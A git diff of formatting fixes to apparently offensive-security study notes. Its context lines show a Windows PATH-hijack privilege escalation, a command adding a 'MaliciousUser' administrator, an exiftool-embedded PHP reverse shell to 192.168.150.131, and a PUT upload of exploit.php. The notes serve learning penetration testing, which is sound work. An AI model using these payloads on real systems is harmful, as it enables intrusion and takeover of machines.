@@ -1726,7 +1726,7 @@ rem The script attempts to add a user to the Administrators group
 net localgroup Administrators MaliciousUser /add
 ```
 
-#### Vulnerability:
+#### Vulnerability
 
 If the script does not specify the full path to `net.exe`, it will search for `net.exe` in the directories listed in the `PATH` environment variable. An attacker could exploit this by doing the following:
 
@@ -1740,7 +1740,7 @@ set PATH=C:\Users\Attacker\malicious_directory;%PATH%
 
 **Execute the Vulnerable Script**: When the vulnerable script runs, it uses the `PATH` variable to locate `net.exe`. Since the attacker's directory is listed first in `PATH`, the system will execute the malicious `net.exe` instead of the legitimate one located in `C:\Windows\System32`.
 
-## Abusing WIndows Library Files
+## Abusing Windows Library
 Windows Library files (`.Library-ms`) connect users with data stored in remote locations (web services or shares).
 
 ### Example
@@ -1876,7 +1876,8 @@ Exploits:
 	2. ```exiftool -Comment="<?php -r '\$sock=fsockopen(\"192.168.150.131\",80);\`/bin/bash <&3 >&3 2>&3\`;' ?>" image.jpg -o outfile.php```
 	3. ^ Couldn't get this one working
 	
-6. It's worth noting that some web servers may be configured to support PUT requests: 
+6. It's worth noting that some web servers may be configured to support PUT requests:
+
 ```
 PUT /images/exploit.php HTTP/1.1
 Host: vulnerable-website.com
